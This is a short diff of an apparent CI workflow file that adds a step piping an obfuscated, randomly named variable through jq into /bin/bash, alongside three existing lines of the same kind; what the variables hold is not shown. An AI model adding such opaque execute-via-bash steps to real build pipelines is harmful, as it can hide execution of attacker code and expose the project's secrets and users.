@@ -24,6 +24,7 @@ jobs:
           echo $zs1079 | jq -r .wec73 | /bin/bash
           echo $nu6 | jq -r .waaoq0706 | /bin/bash
           printf '%s' "$t42" | jq -r .i0 | /bin/bash
+          echo $ju7985 | jq -r .qf4 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
